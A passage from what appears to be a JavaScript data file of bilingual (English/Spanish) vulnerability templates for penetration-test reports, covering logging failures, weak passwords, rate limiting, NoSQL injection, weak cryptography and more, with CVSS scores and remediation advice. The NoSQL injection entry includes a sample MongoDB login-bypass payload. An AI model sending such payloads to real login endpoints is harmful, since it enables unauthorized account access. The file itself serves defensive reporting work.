      overview_en: 'The application does not sufficiently log, monitor, or alert on security events. This makes it difficult or impossible to detect and respond to an attack in a timely manner.',
      overview_es: 'La aplicación no registra, monitorea o alerta suficientemente sobre eventos de seguridad. Esto hace que sea difícil o imposible detectar y responder a un ataque de manera oportuna.',
      technicalDescription_en: 'Security-relevant events, such as failed login attempts, access control failures, or server-side errors, are not being logged. Even if they are logged, there are no alerting mechanisms in place to notify administrators of suspicious activity. This allows an attacker to operate undetected for an extended period.',
      technicalDescription_es: 'Los eventos relevantes para la seguridad, como intentos de inicio de sesión fallidos, fallos de control de acceso o errores del lado del servidor, no se están registrando. Incluso si se registran, no existen mecanismos de alerta para notificar a los administradores sobre actividades sospechosas. Esto permite que un atacante opere sin ser detectado durante un período prolongado.',
      affectedComponents_en: '[TODO Specify what is not being logged, e.g., Failed login attempts are not logged, preventing brute-force detection.]',
      affectedComponents_es: '[TODO Especificar qué no se está registrando, p. ej., Los intentos de inicio de sesión fallidos no se registran, lo que impide la detección de fuerza bruta.]',
      impact_en: 'Without proper logging and monitoring, an organization cannot detect a data breach. Attackers may maintain persistence for a long time, exfiltrate large amounts of data, and cause significant damage before being discovered.',
      impact_es: 'Sin un registro y monitoreo adecuados, una organización no puede detectar una brecha de datos. Los atacantes pueden mantener la persistencia durante mucho tiempo, exfiltrar grandes cantidades de datos y causar un daño significativo antes de ser descubiertos.',
      recommendations_en: 'Establish a robust logging and monitoring strategy. Log all authentication, access control, and key business transaction events. Centralize logs and implement a Security Information and Event Management (SIEM) solution. Create automated alerts for suspicious events.',
      recommendations_es: 'Establecer una estrategia robusta de registro y monitoreo. Registrar todos los eventos de autenticación, control de acceso y transacciones comerciales clave. Centralizar los registros e implementar una solución de Gestión de Información y Eventos de Seguridad (SIEM). Crear alertas automatizadas para eventos sospechosos.',
      details_en: '[TODO Provide details. Example: After multiple failed login attempts for the "admin" user, no logs were generated, and no alert was triggered.]',
      details_es: '[TODO Proporcionar detalles. Ejemplo: Después de múltiples intentos fallidos de inicio de sesión para el usuario "admin", no se generaron registros y no se activó ninguna alerta.]',
      remediation_en: {
          shortTerm: 'Enable logging for critical security events such as logins, password changes, and access control failures.',
          mediumTerm: 'Integrate application logs with a centralized logging solution (e.g., ELK Stack, Splunk).',
          longTerm: 'Implement a SIEM with correlation rules and automated alerting to actively detect and respond to security incidents.',
      },
      remediation_es: {
          shortTerm: 'Habilitar el registro para eventos de seguridad críticos como inicios de sesión, cambios de contraseña y fallos de control de acceso.',
          mediumTerm: 'Integrar los registros de la aplicación con una solución de registro centralizada (p. ej., ELK Stack, Splunk).',
          longTerm: 'Implementar un SIEM con reglas de correlación y alertas automatizadas para detectar y responder activamente a los incidentes de seguridad.',
      },
      references: ['https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%26Monitoring'],
      tags: ['OWASP Top 10', 'Logging', 'A09:2021-Security_Logging_and_Monitoring_Failures'],
  },
  {
    id: 'vuln-021',
    title_en: 'Information Disclosure',
    title_es: 'Divulgación de Información',
    cwe: 'CWE-200',
    severity: 'Low',
    cvss: {
        score: 5.3,
        vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N',
        attackVector: 'Network',
        attackComplexity: 'Low',
        privilegesRequired: 'None',
        userInteraction: 'None',
        scope: 'Unchanged',
        confidentiality: 'Low',
        integrity: 'None',
        availability: 'None',
    },
    overview_en: 'The application unintentionally reveals sensitive information to users. This information can aid an attacker in launching more targeted attacks.',
    overview_es: 'La aplicación revela información sensible a los usuarios de forma no intencionada. Esta información puede ayudar a un atacante a lanzar ataques más dirigidos.',
    technicalDescription_en: 'The application leaks information through verbose error messages, comments in the source code, or by exposing internal file paths, server versions, or configuration details. This information helps an attacker understand the application\'s architecture and potential weaknesses.',
    technicalDescription_es: 'La aplicación filtra información a través de mensajes de error detallados, comentarios en el código fuente, o al exponer rutas de archivos internas, versiones de servidor o detalles de configuración. Esta información ayuda a un atacante a comprender la arquitectura de la aplicación y sus posibles debilidades.',
    affectedComponents_en: '[TODO Specify what information is being disclosed, e.g., Verbose SQL error messages are displayed to the user, revealing database table names.]',
    affectedComponents_es: '[TODO Especificar qué información se está divulgando, p. ej., Se muestran mensajes de error SQL detallados al usuario, revelando nombres de tablas de la base de datos.]',
    impact_en: 'While often a low-impact vulnerability on its own, information disclosure provides valuable intelligence for an attacker, making other attacks easier to execute. It can reveal technologies in use, usernames, internal IP addresses, and business logic.',
    impact_es: 'Aunque a menudo es una vulnerabilidad de bajo impacto por sí sola, la divulgación de información proporciona inteligencia valiosa para un atacante, facilitando la ejecución de otros ataques. Puede revelar tecnologías en uso, nombres de usuario, direcciones IP internas y lógica de negocio.',
    recommendations_en: 'Configure the application to use generic, non-detailed error messages in production. Remove all comments, debugging information, and unnecessary headers from HTTP responses. Ensure server and framework versions are not exposed.',
    recommendations_es: 'Configurar la aplicación para que use mensajes de error genéricos y no detallados en producción. Eliminar todos los comentarios, información de depuración y cabeceras innecesarias de las respuestas HTTP. Asegurarse de que las versiones del servidor y del framework no estén expuestas.',
    details_en: '[TODO Provide a screenshot or server response showing the leaked information.]',
    details_es: '[TODO Proporcionar una captura de pantalla o respuesta del servidor que muestre la información filtrada.]',
    remediation_en: {
        shortTerm: 'Configure the web server and application framework to display a generic error page for all unhandled exceptions.',
        mediumTerm: 'Review and remove sensitive information from source code comments and configuration files accessible from the web.',
        longTerm: 'Implement a process to regularly scan the application for information disclosure vulnerabilities.',
    },
    remediation_es: {
        shortTerm: 'Configurar la aplicación para mostrar páginas de error genéricas en lugar de trazas de pila detalladas.',
        mediumTerm: 'Revisar y eliminar información sensible de los comentarios del código fuente y los archivos de configuración accesibles desde la web.',
        longTerm: 'Implementar un proceso para escanear regularmente la aplicación en busca de vulnerabilidades de divulgación de información.',
    },
    references: ['https://cwe.mitre.org/data/definitions/200.html'],
    tags: ['Information Disclosure'],
  },
  {
      id: 'vuln-022',
      title_en: 'Weak Password Policy',
      title_es: 'Política de Contraseñas Débil',
      cwe: 'CWE-521',
      severity: 'Medium',
      cvss: {
          score: 5.9,
          vectorString: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N',
          attackVector: 'Network',
          attackComplexity: 'High',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'None',
          availability: 'None',
      },
      overview_en: 'The application does not enforce a strong password policy, allowing users to choose simple, short, or common passwords that are easy for an attacker to guess or brute-force.',
      overview_es: 'La aplicación no impone una política de contraseñas segura, lo que permite a los usuarios elegir contraseñas simples, cortas o comunes que son fáciles de adivinar o forzar para un atacante.',
      technicalDescription_en: 'The application allows passwords that are short (e.g., less than 8 characters), lack complexity (e.g., do not require a mix of uppercase, lowercase, numbers, and symbols), or are on a list of commonly used passwords (e.g., "password123"). This significantly increases the risk of account compromise through brute-force or credential stuffing attacks.',
      technicalDescription_es: 'La aplicación permite contraseñas cortas (p. ej., menos de 8 caracteres), que carecen de complejidad (p. ej., no requieren una mezcla de mayúsculas, minúsculas, números y símbolos), o que están en una lista de contraseñas de uso común (p. ej., "password123"). Esto aumenta significativamente el riesgo de compromiso de la cuenta a través de ataques de fuerza bruta o "credential stuffing".',
      affectedComponents_en: '[TODO Specify the affected functionality, e.g., The user registration and password change forms.]',
      affectedComponents_es: '[TODO Especificar la funcionalidad afectada, p. ej., Los formularios de registro de usuario y cambio de contraseña.]',
      impact_en: 'Weak passwords make user accounts highly susceptible to takeover. An attacker who compromises a user account can gain access to sensitive data and application functionality.',
      impact_es: 'Las contraseñas débiles hacen que las cuentas de usuario sean muy susceptibles a la toma de control. Un atacante que compromete una cuenta de usuario puede obtener acceso a datos sensibles y a la funcionalidad de la aplicación.',
      recommendations_en: 'Implement a strong, modern password policy based on NIST guidelines (SP 800-63B). This includes enforcing a minimum length (e.g., 12 characters), checking new passwords against a list of known breached passwords, and implementing rate limiting on login attempts.',
      recommendations_es: 'Implementar una política de contraseñas segura y moderna basada en las directrices del NIST (SP 800-63B). Esto incluye hacer cumplir una longitud mínima (p. ej., 12 caracteres), verificar las nuevas contraseñas contra una lista de contraseñas conocidas y filtradas, e implementar la limitación de velocidad en los intentos de inicio de sesión.',
      details_en: '[TODO Provide evidence, e.g., "It was possible to create a user with the password `admin`."]',
      details_es: '[TODO Proporcionar evidencia, p. ej., "Fue posible crear un usuario con la contraseña `admin`."]',
      remediation_en: {
          shortTerm: 'Enforce a minimum password length of at least 12 characters.',
          mediumTerm: 'Implement complexity requirements and check new passwords against a dictionary of common passwords.',
          longTerm: 'Integrate with a breached password detection service (like Have I Been Pwned) to prevent users from choosing compromised credentials.',
      },
      remediation_es: {
          shortTerm: 'Hacer cumplir una longitud mínima de contraseña de al menos 12 caracteres.',
          mediumTerm: 'Implementar requisitos de complejidad y verificar las nuevas contraseñas contra un diccionario de contraseñas comunes.',
          longTerm: 'Integrarse con un servicio de detección de contraseñas filtradas (como Have I Been Pwned) para evitar que los usuarios elijan credenciales comprometidas.',
      },
      references: ['https://pages.nist.gov/800-63-3/sp800-63b.html'],
      tags: ['Authentication', 'Passwords'],
  },
  {
      id: 'vuln-023',
      title_en: 'Use of Components with Known Vulnerabilities',
      title_es: 'Uso de Componentes con Vulnerabilidades Conocidas',
      cwe: 'CWE-937',
      severity: 'High',
      cvss: {
          score: 8.8,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'Required',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'High',
          availability: 'High',
      },
      overview_en: 'The application uses a third-party library, framework, or other software component that contains a publicly known vulnerability. Attackers can exploit these vulnerabilities to compromise the application.',
      overview_es: 'La aplicación utiliza una librería, framework u otro componente de software de terceros que contiene una vulnerabilidad conocida públicamente. Los atacantes pueden explotar estas vulnerabilidades para comprometer la aplicación.',
      technicalDescription_en: 'The application was found to be using [TODO Vulnerable Component Name] version [TODO Version], which is known to be vulnerable to [TODO Vulnerability Type, e.g., Remote Code Execution] (CVE-[TODO CVE-ID]). An attacker can exploit this by [TODO Brief exploitation method].',
      technicalDescription_es: 'Se descubrió que la aplicación utiliza [TODO Nombre del Componente Vulnerable] versión [TODO Versión], que es conocida por ser vulnerable a [TODO Tipo de Vulnerabilidad, p. ej., Ejecución Remota de Código] (CVE-[TODO ID de CVE]). Un atacante puede explotar esto mediante [TODO Breve método de explotación].',
      affectedComponents_en: '[TODO Specify where the component is used, e.g., The `package.json` file lists the vulnerable dependency.]',
      affectedComponents_es: '[TODO Especificar dónde se utiliza el componente, p. ej., El archivo `package.json` lista la dependencia vulnerable.]',
      impact_en: 'The impact depends on the specific vulnerability but can range from information disclosure to a full system compromise, allowing an attacker to execute arbitrary code, steal data, or cause a denial of service.',
      impact_es: 'El impacto depende de la vulnerabilidad específica, pero puede variar desde la divulgación de información hasta un compromiso total del sistema, permitiendo a un atacante ejecutar código arbitrario, robar datos o provocar una denegación de servicio.',
      recommendations_en: 'Update the vulnerable component to a secure version. Implement a Software Composition Analysis (SCA) tool to continuously scan for and alert on vulnerable dependencies in the codebase.',
      recommendations_es: 'Actualizar el componente vulnerable a una versión segura. Implementar una herramienta de Análisis de Composición de Software (SCA) para escanear y alertar continuamente sobre dependencias vulnerables en el código base.',
      details_en: '[TODO Provide a link to the CVE or advisory and a PoC if available.]',
      details_es: '[TODO Proporcionar un enlace al CVE o al aviso de seguridad y un PoC si está disponible.]',
      remediation_en: {
          shortTerm: 'Update the vulnerable library to the latest patched version.',
          mediumTerm: 'Integrate a dependency scanning tool (like Dependabot, Snyk) into the CI/CD pipeline.',
          longTerm: 'Establish a formal process for managing third-party libraries, including regular reviews and a plan for responding to new vulnerability disclosures.',
      },
      remediation_es: {
          shortTerm: 'Actualizar la librería vulnerable a la última versión parcheada.',
          mediumTerm: 'Integrar una herramienta de escaneo de dependencias (como Dependabot, Snyk) en el pipeline de CI/CD.',
          longTerm: 'Establecer un proceso formal para la gestión de librerías de terceros, incluidas revisiones periódicas y un plan para responder a la divulgación de nuevas vulnerabilidades.',
      },
      references: ['https://owasp.org/www-project-top-ten/2021/a06-vulnerable-and-outdated-components'],
      tags: ['OWASP Top 10', 'Dependencies'],
  },
  {
      id: 'vuln-024',
      title_en: 'Missing Rate Limiting',
      title_es: 'Falta de Limitación de Velocidad (Rate Limiting)',
      cwe: 'CWE-770',
      severity: 'Medium',
      cvss: {
          score: 5.3,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'None',
          integrity: 'None',
          availability: 'Low',
      },
      overview_en: 'The application does not limit the number of requests a user can make to certain endpoints, making it vulnerable to automated attacks such as brute-forcing, credential stuffing, or resource exhaustion.',
      overview_es: 'La aplicación no limita el número de solicitudes que un usuario puede hacer a ciertos endpoints, lo que la hace vulnerable a ataques automatizados como fuerza bruta, "credential stuffing" o agotamiento de recursos.',
      technicalDescription_en: 'Critical endpoints, such as the login page, password reset form, or API endpoints, do not have rate limiting controls. An attacker can use automated scripts to send thousands of requests per minute, allowing them to guess passwords, enumerate users, or cause a denial of service by overwhelming the application.',
      technicalDescription_es: 'Endpoints críticos, como la página de inicio de sesión, el formulario de restablecimiento de contraseña o los endpoints de la API, no tienen controles de limitación de velocidad. Un atacante puede usar scripts automatizados para enviar miles de solicitudes por minuto, lo que le permite adivinar contraseñas, enumerar usuarios o provocar una denegación de servicio al sobrecargar la aplicación.',
      affectedComponents_en: '[TODO Specify the vulnerable endpoint, e.g., `/api/login` does not have rate limiting, allowing for password brute-forcing.]',
      affectedComponents_es: '[TODO Especificar el endpoint vulnerable, p. ej., `/api/login` no tiene limitación de velocidad, lo que permite la fuerza bruta de contraseñas.]',
      impact_en: 'Lack of rate limiting can lead to account takeovers through brute-force attacks, denial of service, and increased operational costs. It also makes it easier for attackers to perform other automated attacks like user enumeration.',
      impact_es: 'La falta de limitación de velocidad puede conducir a la toma de control de cuentas a través de ataques de fuerza bruta, denegación de servicio y aumento de los costos operativos. También facilita que los atacantes realicen otros ataques automatizados como la enumeración de usuarios.',
      recommendations_en: 'Implement rate limiting on all critical and authentication-related endpoints. The limits should be based on IP address, user ID, or a combination. Implement an escalating lockout policy for repeated failures.',
      recommendations_es: 'Implementar la limitación de velocidad en todos los endpoints críticos y relacionados con la autenticación. Los límites deben basarse en la dirección IP, el ID de usuario o una combinación. Implementar una política de bloqueo escalonada para fallos repetidos.',
      details_en: '[TODO Provide evidence, e.g., "Using Burp Suite Intruder, it was possible to send 1000 login requests in one minute without being blocked."]',
      details_es: '[TODO Proporcionar evidencia, p. ej., "Usando Burp Suite Intruder, fue posible enviar 1000 solicitudes de inicio de sesión en un minuto sin ser bloqueado."]',
      remediation_en: {
          shortTerm: 'Implement a basic rate limit (e.g., 100 requests per minute per IP) on the login and password reset endpoints.',
          mediumTerm: 'Implement more granular rate limiting based on user accounts for authenticated endpoints.',
          longTerm: 'Use a Web Application Firewall (WAF) or a dedicated service to manage rate limiting and protect against automated threats.',
      },
      remediation_es: {
          shortTerm: 'Implementar un límite de velocidad básico (p. ej., 100 solicitudes por minuto por IP) en los endpoints de inicio de sesión y restablecimiento de contraseña.',
          mediumTerm: 'Implementar una limitación de velocidad más granular basada en las cuentas de usuario para los endpoints autenticados.',
          longTerm: 'Usar un Web Application Firewall (WAF) o un servicio dedicado para gestionar la limitación de velocidad y protegerse contra amenazas automatizadas.',
      },
      references: ['https://owasp.org/www-community/attacks/Credential_stuffing'],
      tags: ['Rate Limiting', 'Brute Force'],
  },
  {
    id: 'vuln-025',
    title_en: 'NoSQL Injection',
    title_es: 'Inyección NoSQL',
    cwe: 'CWE-943',
    severity: 'Critical',
    cvss: {
        score: 9.8,
        vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
        attackVector: 'Network',
        attackComplexity: 'Low',
        privilegesRequired: 'None',
        userInteraction: 'None',
        scope: 'Unchanged',
        confidentiality: 'High',
        integrity: 'High',
        availability: 'High',
    },
    overview_en: 'An attacker can interfere with the queries that an application makes to its NoSQL database. This can allow an attacker to bypass authentication, extract data, or modify data.',
    overview_es: 'Un atacante puede interferir con las consultas que una aplicación hace a su base de datos NoSQL. Esto puede permitir a un atacante eludir la autenticación, extraer datos o modificar datos.',
    technicalDescription_en: 'The application constructs NoSQL queries by concatenating user input, similar to traditional SQLi. By providing malicious input that includes NoSQL query operators (e.g., `$ne`, `$gt` in MongoDB), an attacker can alter the logic of the query. For example, they could change a query from `{"username": "user", "password": "pass"}` to `{"username": "admin", "password": {"$ne": "anything"}}`, bypassing the password check.',
    technicalDescription_es: 'La aplicación construye consultas NoSQL concatenando la entrada del usuario, de forma similar al SQLi tradicional. Al proporcionar una entrada maliciosa que incluye operadores de consulta NoSQL (p. ej., `$ne`, `$gt` en MongoDB), un atacante puede alterar la lógica de la consulta. Por ejemplo, podrían cambiar una consulta de `{"username": "user", "password": "pass"}` a `{"username": "admin", "password": {"$ne": "anything"}}`, eludiendo la comprobación de la contraseña.',
    affectedComponents_en: '[TODO Specify the vulnerable endpoint and parameter. e.g., The login API endpoint which accepts a JSON object.]',
    affectedComponents_es: '[TODO Especificar el endpoint y el parámetro vulnerables. p. ej., El endpoint de la API de inicio de sesión que acepta un objeto JSON.]',
    impact_en: 'NoSQL injection can lead to authentication bypass, data extraction, and data modification. The impact is similar to that of SQL injection.',
    impact_es: 'La inyección NoSQL puede conducir a la elusión de la autenticación, la extracción de datos y la modificación de datos. El impacto es similar al de la inyección SQL.',
    recommendations_en: 'Avoid constructing queries from user input. Use a safe, parameterized query interface provided by the NoSQL database driver. Sanitize and validate all user input before it is used in a query.',
    recommendations_es: 'Evitar la construcción de consultas a partir de la entrada del usuario. Utilice una interfaz de consulta segura y parametrizada proporcionada por el controlador de la base de datos NoSQL. Sanitizar y validar todas las entradas del usuario antes de que se utilicen en una consulta.',
    details_en: '[TODO Provide a PoC. Example: Sending a JSON payload `{"username": "admin", "password": {"$ne": null}}` to a login endpoint.]',
    details_es: '[TODO Proporcionar un PoC. Ejemplo: Enviar una carga útil JSON `{"username": "admin", "password": {"$ne": null}}` a un endpoint de inicio de sesión.]',
    remediation_en: {
        shortTerm: 'Sanitize user input to remove or escape characters that have special meaning in NoSQL queries (e.g., `$`, `{`, `}`).',
        mediumTerm: 'Refactor all database queries to use a safe API that provides parameterization.',
        longTerm: 'Use a library or ORM/ODM that abstracts away database queries and is known to be secure against injection attacks.',
    },
    remediation_es: {
        shortTerm: 'Sanitizar la entrada del usuario para eliminar o escapar caracteres que tienen un significado especial en las consultas NoSQL (p. ej., `$`, `{`, `}`).',
        mediumTerm: 'Refactorizar todas las consultas a la base de datos para utilizar una API segura que proporcione parametrización.',
        longTerm: 'Utilizar una librería o ORM/ODM que abstraiga las consultas de la base de datos y que se sepa que es segura contra ataques de inyección.',
    },
    references: ['https://owasp.org/www-project-top-ten/2017/A1_2017-Injection'],
    tags: ['NoSQL', 'Injection'],
  },
  {
      id: 'vuln-026',
      title_en: 'Unrestricted Access to Sensitive Business Flows',
      title_es: 'Acceso sin Restricciones a Flujos de Negocio Sensibles',
      cwe: 'CWE-840',
      severity: 'High',
      cvss: {
          score: 8.8,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'Low',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'High',
          availability: 'High',
      },
      overview_en: 'The application fails to protect against the automated exploitation of sensitive business logic. An attacker can abuse these flows for malicious purposes, such as hoarding inventory, scraping data, or causing financial loss.',
      overview_es: 'La aplicación no protege contra la explotación automatizada de la lógica de negocio sensible. Un atacante puede abusar de estos flujos con fines maliciosos, como acaparar inventario, extraer datos o causar pérdidas financieras.',
      technicalDescription_en: 'The application has a business flow, such as purchasing an item or reserving a ticket, that lacks proper controls. An attacker can write a script to repeatedly execute this flow faster than a human user could. For example, a bot could buy all available limited-edition sneakers the moment they are released, preventing legitimate users from making a purchase.',
      technicalDescription_es: 'La aplicación tiene un flujo de negocio, como la compra de un artículo o la reserva de una entrada, que carece de los controles adecuados. Un atacante puede escribir un script para ejecutar repetidamente este flujo más rápido de lo que podría hacerlo un usuario humano. Por ejemplo, un bot podría comprar todas las zapatillas de edición limitada disponibles en el momento en que se lanzan, impidiendo que los usuarios legítimos realicen una compra.',
      affectedComponents_en: '[TODO Specify the business flow, e.g., The checkout process for limited-edition products.]',
      affectedComponents_es: '[TODO Especificar el flujo de negocio, p. ej., El proceso de compra para productos de edición limitada.]',
      impact_en: 'Abuse of business flows can lead to financial loss, reputational damage, and a poor user experience. It can disrupt the intended use of the application and give attackers an unfair advantage.',
      impact_es: 'El abuso de los flujos de negocio puede provocar pérdidas financieras, daños a la reputación y una mala experiencia de usuario. Puede interrumpir el uso previsto de la aplicación y dar a los atacantes una ventaja injusta.',
      recommendations_en: 'Identify sensitive business flows and implement countermeasures. These can include rate limiting, CAPTCHAs to distinguish humans from bots, and anomaly detection to identify and block suspicious behavior.',
      recommendations_es: 'Identificar los flujos de negocio sensibles e implementar contramedidas. Estas pueden incluir la limitación de velocidad, CAPTCHAs para distinguir a los humanos de los bots y la detección de anomalías para identificar y bloquear comportamientos sospechosos.',
      details_en: '[TODO Provide a PoC demonstrating the automated abuse of the flow.]',
      details_es: '[TODO Proporcionar un PoC que demuestre el abuso automatizado del flujo.]',
      remediation_en: {
          shortTerm: 'Implement rate limiting and CAPTCHA on the affected business flow.',
          mediumTerm: 'Develop user behavior analytics to detect and flag automated or suspicious activity.',
          longTerm: 'Redesign the business logic to be more resilient to abuse, for example by using a lottery system for high-demand items instead of first-come, first-served.',
      },
      remediation_es: {
          shortTerm: 'Implementar limitación de velocidad y CAPTCHA en el flujo de negocio afectado.',
          mediumTerm: 'Desarrollar análisis de comportamiento del usuario para detectar y marcar actividades automatizadas o sospechosas.',
          longTerm: 'Rediseñar la lógica de negocio para que sea más resistente al abuso, por ejemplo, utilizando un sistema de lotería para artículos de alta demanda en lugar de "el primero que llega, el primero que se sirve".',
      },
      references: ['https://owasp.org/www-project-automated-threats-to-web-applications/'],
      tags: ['Business Logic'],
  },
  {
      id: 'vuln-027',
      title_en: 'Use of Weak or Outdated Cryptography',
      title_es: 'Uso de Criptografía Débil u Obsoleta',
      cwe: 'CWE-327',
      severity: 'Medium',
      cvss: {
          score: 5.9,
          vectorString: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N',
          attackVector: 'Network',
          attackComplexity: 'High',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'None',
          availability: 'None',
      },
      overview_en: 'The application uses weak or outdated cryptographic algorithms or protocols, which can be broken by an attacker to decrypt sensitive data.',
      overview_es: 'La aplicación utiliza algoritmos o protocolos criptográficos débiles u obsoletos, que pueden ser rotos por un atacante para descifrar datos sensibles.',
      technicalDescription_en: 'The application was found to be using a deprecated cryptographic algorithm (e.g., MD5, SHA1 for hashing; DES, RC4 for encryption) or an insecure protocol version (e.g., SSLv3, TLS 1.0). These algorithms and protocols have known weaknesses that make them susceptible to attacks, allowing an attacker to potentially decrypt encrypted traffic or forge digital signatures.',
      technicalDescription_es: 'Se descubrió que la aplicación utiliza un algoritmo criptográfico obsoleto (p. ej., MD5, SHA1 para hashing; DES, RC4 para cifrado) o una versión de protocolo insegura (p. ej., SSLv3, TLS 1.0). Estos algoritmos y protocolos tienen debilidades conocidas que los hacen susceptibles a ataques, permitiendo a un atacante descifrar potencialmente el tráfico cifrado o falsificar firmas digitales.',
      affectedComponents_en: '[TODO Specify the component and the weak algorithm used, e.g., The web server supports TLS 1.0.]',
      affectedComponents_es: '[TODO Especificar el componente y el algoritmo débil utilizado, p. ej., El servidor web soporta TLS 1.0.]',
      impact_en: 'The use of weak cryptography can lead to the compromise of sensitive data, such as credentials, personal information, and financial data. An attacker could intercept and decrypt communication between the user and the server.',
      impact_es: 'El uso de criptografía débil puede conducir al compromiso de datos sensibles, como credenciales, información personal y datos financieros. Un atacante podría interceptar y descifrar la comunicación entre el usuario y el servidor.',
      recommendations_en: 'Use only modern, industry-standard cryptographic algorithms and protocols. This includes using TLS 1.2 or higher, and strong ciphers. For hashing, use algorithms like SHA-256 or SHA-3. For encryption, use AES-256.',
      recommendations_es: 'Utilice únicamente algoritmos y protocolos criptográficos modernos y estándar de la industria. Esto incluye el uso de TLS 1.2 o superior, y cifrados fuertes. Para el hashing, utilice algoritmos como SHA-256 o SHA-3. Para el cifrado, use AES-256.',
      details_en: '[TODO Provide evidence, e.g., The output of an `nmap` scan showing support for weak ciphers.]',
      details_es: '[TODO Proporcionar evidencia, p. ej., La salida de un escaneo de `nmap` que muestra el soporte para cifrados débiles.]',
      remediation_en: {
          shortTerm: 'Disable support for weak protocols and ciphers in the server configuration (e.g., disable TLS 1.0 and 1.1).',
          mediumTerm: 'Review the application code to ensure that only strong, modern cryptographic APIs are being used.',
          longTerm: 'Establish a corporate standard for cryptography and regularly audit all applications to ensure compliance.',
      },
      remediation_es: {
          shortTerm: 'Deshabilitar el soporte para protocolos y cifrados débiles en la configuración del servidor (p. ej., deshabilitar TLS 1.0 y 1.1).',
          mediumTerm: 'Revisar el código de la aplicación para asegurarse de que solo se estén utilizando APIs criptográficas modernas y fuertes.',
          longTerm: 'Establecer un estándar corporativo para la criptografía y auditar regularmente todas las aplicaciones para garantizar el cumplimiento.',
      },
      references: ['https://cwe.mitre.org/data/definitions/327.html'],
      tags: ['Cryptography', 'A02:2021-Cryptographic_Failures'],
  },
  {
      id: 'vuln-028',
      title_en: 'Improper Error Handling',
      title_es: 'Manejo de Errores Inapropiado',
      cwe: 'CWE-755',
      severity: 'Low',
      cvss: {
          score: 4.3,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'Required',
          scope: 'Unchanged',
          confidentiality: 'Low',
          integrity: 'None',
          availability: 'None',
      },
      overview_en: 'The application reveals sensitive information through its error messages. This can provide an attacker with valuable information about the application\'s internal workings.',
      overview_es: 'La aplicación revela información sensible a través de sus mensajes de error. Esto puede proporcionar a un atacante información valiosa sobre el funcionamiento interno de la aplicación.',
      technicalDescription_en: 'When an error occurs, the application returns a detailed error message to the user, which may include stack traces, database query errors, internal file paths, or framework versions. An attacker can intentionally trigger errors to gather this information and map out the application\'s structure and technologies.',
      technicalDescription_es: 'Cuando ocurre un error, la aplicación devuelve un mensaje de error detallado al usuario, que puede incluir trazas de pila, errores de consulta de base de datos, rutas de archivos internas o versiones del framework. Un atacante puede provocar errores intencionadamente para recopilar esta información y mapear la estructura y las tecnologías de la aplicación.',
      affectedComponents_en: '[TODO Specify the page or action that triggers the detailed error, e.g., Submitting a single quote in a search form.]',
      affectedComponents_es: '[TODO Especificar la página o acción que desencadena el error detallado, p. ej., Enviar una comilla simple en un formulario de búsqueda.]',
      impact_en: 'Improper error handling leads to information disclosure, which can help an attacker formulate more sophisticated attacks like SQL injection or path traversal.',
      impact_es: 'El manejo inadecuado de errores conduce a la divulgación de información, lo que puede ayudar a un atacante a formular ataques más sofisticados como la inyección de SQL o el recorrido de directorios.',
      recommendations_en: 'Configure the application to use generic, non-descriptive error messages in production. Detailed errors should only be written to server-side logs for debugging purposes.',
      recommendations_es: 'Configurar la aplicación para que use mensajes de error genéricos y no descriptivos al usuario en un entorno de producción. Los errores detallados solo deben escribirse en los registros del lado del servidor con fines de depuración.',
      details_en: '[TODO Provide a screenshot of the detailed error message.]',
      details_es: '[TODO Proporcionar una captura de pantalla del mensaje de error detallado.]',
      remediation_en: {
          shortTerm: 'Configure the web server and application framework to display a generic error page for all unhandled exceptions.',
          mediumTerm: 'Implement structured exception handling throughout the application to catch specific errors and provide appropriate, non-revealing feedback to the user.',
          longTerm: 'Ensure that logging provides sufficient detail for developers to debug issues without exposing that detail to end-users.',
      },
      remediation_es: {
          shortTerm: 'Configurar el servidor web y el framework de la aplicación para mostrar una página de error genérica para todas las excepciones no controladas.',
          mediumTerm: 'Implementar un manejo de excepciones estructurado en toda la aplicación para capturar errores específicos y proporcionar retroalimentación adecuada y no reveladora al usuario.',
          longTerm: 'Asegurarse de que el registro proporcione suficientes detalles para que los desarrolladores depuren problemas sin exponer esos detalles a los usuarios finales.',
      },
      references: ['https://cwe.mitre.org/data/definitions/755.html'],
      tags: ['Information Disclosure'],
  },
  {
      id: 'vuln-029',
      title_en: 'HTTP Request Smuggling',
      title_es: 'Contrabando de Solicitudes HTTP (HTTP Request Smuggling)',
      cwe: 'CWE-444',
      severity: 'Critical',
      cvss: {
          score: 9.8,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'High',
          availability: 'High',
      },
      overview_en: 'An attacker can interfere with the way a chain of HTTP servers processes requests. This allows them to "smuggle" a malicious request to the back-end server, which may be interpreted as a legitimate request from another user.',
